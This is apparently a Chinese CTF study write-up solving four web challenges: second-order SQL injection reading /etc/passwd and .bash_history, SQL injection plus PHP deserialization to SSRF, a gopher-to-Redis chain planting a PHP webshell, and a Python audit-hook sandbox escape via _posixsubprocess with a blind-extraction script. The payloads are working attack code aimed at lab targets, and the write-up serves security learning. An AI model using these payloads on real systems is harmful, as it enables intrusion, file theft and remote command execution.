## [网鼎杯 2018]Comment
进来是一个留言板，需要登录才能写，要爆破后三位密码。
我们先扫目录：
![](assets/Day%206/file-20251224142401994.png)

发现有很多git文件，这里学习了一下githacker使用
```powershell
  githacker --url http://2b661b6a-7be0-408c-84e4-0aa48b856bee.node4.buuoj.cn:81/ --folder ./result
```
可以下载下来git仓库，还有一份源码：
![](assets/Day%206/file-20251224142342607.png)
```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>

```
我们发现这份源码好像也实现不了网站功能呀，怀疑是不完整源码，又去学习了一下恢复git文件

我们先通过git命令找到历史记录：
```powershell
PS D:\webtool\GitHacker\result\6bc57b1d5399283fce7fbb0c289a505f> git log --reflog
```
然后找到完整源码的文件恢复：
```powershell
PS D:\webtool\GitHacker\result\6bc57b1d5399283fce7fbb0c289a505f> git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
```
![](assets/Day%206/file-20251224142721761.png)
具体怎么判断的哪个是完整的我也不清楚，大概就是看`refs/stash 标记`
然后我们就得到了完整的源代码了：

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```
很明显发现一个`wirte`模式，执行`insert`命令，`comment`模式执行查询，这是一个二次注入的特征。
首先我们尝试爆破一个密码，这里猜测是整数：
![](assets/Day%206/file-20251224161904911.png)
注意到只有pauload为`666`时，响应大小最大且存在302跳转，那这应该就是正确密码了。
下面进行二次注入，这里查询得到的是`category`,然后又被原样写入，所以对该字段注入
输入流程：
1. 在`do=write`页面payload：
```http
title=12&category=12',content=(select(load_file("/etc/passwd"))),/*&content=123
``` 
注意最后的`/*`让后面的`content`字段被注释，这样我们才能控制该字段。
前面`12'`这里引号构造闭合，然后我们就能随意构造`content`字段，注意最外层`()`不能去掉因为这里要拼接到sql语句后要先让他执行我们的查询，不然有语法错误
2. 在`do=comment`页面payload：
```http
content=*/#&bo_id=4
```
这里为了和上面的`/*`一起一起形成注释，把原本的`content`字段注释掉，然后就形成了二次注入
因为把上面我们的输入取出来了，有注入进去，此时就连原本存在的`addslashes()`转义都消失了。
3. 访问`/comment.php?id=4`
查询结果，此时会查到注入的结果，注意每次注入要换一个id，上一步也一样。
![500](assets/Day%206/file-20251224171541840.png)
这里用到了`load_file`是因为常规的注入没有找到flag，所以试试读文件。
注意到web目录：
![](assets/Day%206/file-20251224171722142.png)
是在`/home`下面，看一下web目录的操作记录：
```http
title=12&category=12',content=(select(load_file("/home/www/.bash_history"))),/*&content=123
```
![](assets/Day%206/file-20251224172022201.png)
可以看到当前项由`html.zip`在原本`/tmp`目录下解压再复制到`/var/www`，并且记录了关于项目`html`文件结构的`.DS_Store`在`/tmp`目录中仍存在一份，去读取这个文件了解下项目结构。
![500](assets/Day%206/file-20251224172445156.png)
都是不可见字符，我们想到可以用`hex()`函数读取16进制编码出来
```http
title=12&category=12',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*&content=123
```
得到的16进制转成字符串，可以用在线网站
https://www.sojson.com/hexadecimal.html
![](assets/Day%206/file-20251224173111303.png)
得到了flag的文件路径，`flag_8946e1ff1ee3e40f.php`
```http
title=12&category=12',content=(select(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*&content=123
```
![](assets/Day%206/file-20251224173652831.png)

# [网鼎杯 2018]Fakebook

dirsearch扫一波：
![500](assets/Day%206/file-20251224175237686.png)
有`robots.txt`去看看。
![](assets/Day%206/file-20251224175355330.png)
备份文件，下下来看看：
```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```
看到`curl_exec`那应该就是打ssrf
随便测试、一下，注意到添加blog之后，点击是可以看内容的
![](assets/Day%206/file-20251224180129633.png)我们换成www.baidu.com，访问，确实得到了网页html代码，不过是base64形式：
![](assets/Day%206/file-20251224181442629.png)
这里又想测一下sql注入，测一下，发现居然也存在数字型sql，并且过滤了union select连写，我们试一下注释符，可以绕过
## 方法一：
然后直接load_file读文件
```http
?no=0 unioN/**/ select 1,(select(load_file("/var/www/html/flag.php"))),3,4
```
## 方法二：
常规注入，最后把表中数据读到：
```http
?no=0 unioN/**/ select 1,group_concat(no,'~',username,'~',passwd,'~',data),3,4 from users #
```
```sql
1~admin~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:13;s:4:"blog";s:8:"blog.com";},2~admin1~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin1";s:3:"age";i:13;s:4:"blog";s:9:"baidu.com";},3~admin2~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin2";s:3:"age";i:13;s:4:"blog";s:13:"www.baidu.com";},4~admin4~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin4";s:3:"age";i:13;s:4:"blog";s:26:"7f000001.c0a80001.rbndr.us";},5~admin5~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin5";s:3:"age";i:13;s:4:"blog";s:21:"http://local.test.com";}
```
得到这个，就发现`data`字段是序列化存储的；报错也有反序列化失败，那想会不会存在反序列化漏洞
![](assets/Day%206/file-20251224183534546.png)
我们再联想一下前面发现疑似SSRF的，它本身不能填file协议，那如果我们反序列化更改填入的blog，换成其他协呢？
exp:
```php
<?php
class UserInfo
{
    public $name = "1";
    public $age = 12;
    public $blog = "file:///etc/passwd";
}

$userInfo = new UserInfo();
echo serialize($userInfo);
```
我们上面的注入过程知道了第四个是`data`的位置，那我们试试在第4个位置注入我们的payload：
```http
?no=0 unioN/**/ select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:12;s:4:"blog";s:18:"file:///etc/passwd";}' #
```
![](assets/Day%206/file-20251224184545970.png)
看到常规读到。这里这个sql注入+php反序列化+ssrf还是很有意思
# [网鼎杯 2020 玄武组]SSRFMe
```php
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }

}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
}
else{
    highlight_file(__FILE__);
}
// Please visit hint.php locally.
?>
```
按照提示看一下`hint.php`......原来要本地，那应该是打ssrf，我们看看源码先
127.0.0.1被waf了，0.0.0.0绕过:
```http
?url=http://0.0.0.0/hint.php
```
得到`hint.php`：
```php
<?php
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
  highlight_file(__FILE__);
}
if(isset($_POST['file'])){
  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
}

```
看到了redis密码，那就是打密码泄露的redis了，加上auth root就好了，我们直接写webshell
payload：
```sql
auth root
config set dir /var/www/html/
config set dbfilename shell.php
set margin "<?php system($_POST['cmd']);?>"
save
quit
```
url编码两次用gopher协议发包
```http
?url=gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%252F%250Aconfig%2520set%2520dbfilename%2520shell.php%250Aset%2520margin%2520%2522%253C%253Fphp%2520system(%2524_POST%255B%27cmd%27%255D)%253B%253F%253E%2522%250Asave%250Aquit
```
![500](assets/Day%206/file-20251224202619629.png)
最后命令执行
![500](assets/Day%206/file-20251224202452764.png)

# [阿里云CTF2025]ezoj
这题不算复现吧，就算是学习了，想复现然后搞环境什么的搞了很久还是不行，应该是和题目环境有点差别，怎么都打不出来。但是理解了一下怎么做吧。
给了源码：
```python
import os
import subprocess
import uuid
import json
from flask import Flask, request, jsonify, send_file
from pathlib import Path

app = Flask(__name__)

SUBMISSIONS_PATH = Path("./submissions")
PROBLEMS_PATH = Path("./problems")

SUBMISSIONS_PATH.mkdir(parents=True, exist_ok=True)

CODE_TEMPLATE = """
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)


"""


class OJTimeLimitExceed(Exception):
    pass


class OJRuntimeError(Exception):
    pass


@app.route("/")
def index():
    return send_file("static/index.html")


@app.route("/source")
def source():
    return send_file("server.py")


@app.route("/api/problems")
def list_problems():
    problems_dir = PROBLEMS_PATH
    problems = []
    for problem in problems_dir.iterdir():
        problem_config_file = problem / "problem.json"
        if not problem_config_file.exists():
            continue

        problem_config = json.load(problem_config_file.open("r"))
        problem = {
            "problem_id": problem.name,
            "name": problem_config["name"],
            "description": problem_config["description"],
        }
        problems.append(problem)

    problems = sorted(problems, key=lambda x: x["problem_id"])

    problems = {"problems": problems}
    return jsonify(problems), 200


@app.route("/api/submit", methods=["POST"])
def submit_code():
    try:
        data = request.get_json()
        code = data.get("code")
        problem_id = data.get("problem_id")

        if code is None or problem_id is None:
            return (
                jsonify({"status": "ER", "message": "Missing 'code' or 'problem_id'"}),
                400,
            )

        problem_id = str(int(problem_id))
        problem_dir = PROBLEMS_PATH / problem_id
        if not problem_dir.exists():
            return (
                jsonify(
                    {"status": "ER", "message": f"Problem ID {problem_id} not found!"}
                ),
                404,
            )

        code_filename = SUBMISSIONS_PATH / f"submission_{uuid.uuid4()}.py"
        with open(code_filename, "w") as code_file:
            code = CODE_TEMPLATE + code
            code_file.write(code)

        result = judge(code_filename, problem_dir)

        code_filename.unlink()

        return jsonify(result)

    except Exception as e:
        return jsonify({"status": "ER", "message": str(e)}), 500


def judge(code_filename, problem_dir):
    test_files = sorted(problem_dir.glob("*.input"))
    total_tests = len(test_files)
    passed_tests = 0

    try:
        for test_file in test_files:
            input_file = test_file
            expected_output_file = problem_dir / f"{test_file.stem}.output"

            if not expected_output_file.exists():
                continue

            case_passed = run_code(code_filename, input_file, expected_output_file)

            if case_passed:
                passed_tests += 1

        if passed_tests == total_tests:
            return {"status": "AC", "message": f"Accepted"}
        else:
            return {
                "status": "WA",
                "message": f"Wrang Answer: pass({passed_tests}/{total_tests})",
            }
    except OJRuntimeError as e:
        return {"status": "RE", "message": f"Runtime Error: ret={e.args[0]}"}
    except OJTimeLimitExceed:
        return {"status": "TLE", "message": "Time Limit Exceed"}


def run_code(code_filename, input_file, expected_output_file):
    with open(input_file, "r") as infile, open(
        expected_output_file, "r"
    ) as expected_output:
        expected_output_content = expected_output.read().strip()

        process = subprocess.Popen(
            ["python3", code_filename],
            stdin=infile,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        try:
            stdout, stderr = process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            raise OJTimeLimitExceed

        if process.returncode != 0:
            raise OJRuntimeError(process.returncode)

        if stdout.strip() == expected_output_content:
            return True
        else:
            return False


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```
python沙箱逃逸
看到:
```python
CODE_TEMPLATE = """
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)


"""
```
这里时启用了审计钩子，只要是不在白名单的函数就会报错
这里算是好的给了我们import，但是无法执行命令，我这里也只知道一个方法：
https://xz.aliyun.com/news/12093
`_posixsubprocess 执行命令`

该模块的核心功能是 `fork_exec `函数:
`fork_exec` 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.

用法就是：
```python
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

所以这题的exp：
```python
import string
import requests

url = "http://121.41.238.106:63869/api/submit"
flag = ""

for i in range(0,50):
    for s in '-'+'}'+'{'+string.ascii_lowercase+string.digits:
        json = {"problem_id":"0","code":f"import os\nimport _posixsubprocess\n_posixsubprocess.fork_exec([b\"anything\", \"-c\",\"import os;f=os.popen('cat /f*').read();\\nif f[{i}]=='{s}':print(2)\"], [b\"/bin/python3\"], True, (), None, None, -1, -1, -1, -1, -1,-1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)\n"}
        res = requests.post(url, json=json)
        if res.json()['message'] == "Wrang Answer: pass(1/10)":
            flag += s
            print(flag)
            break
    print(i)
```
脚本的逻辑就是执行命令的时候，因为答案里面有2，所以你如果print(2)，那就会返回:
`Wrang Answer: pass(1/10)`
如果没有的话，那就一个都不对，就会返回
`Wrang Answer: pass(0/10)'
这里就是先绕过钩子读取到flag，然后一个个对比，如果对上了一个字符就`print(2)`，
这样进行布尔盲注。读取到flag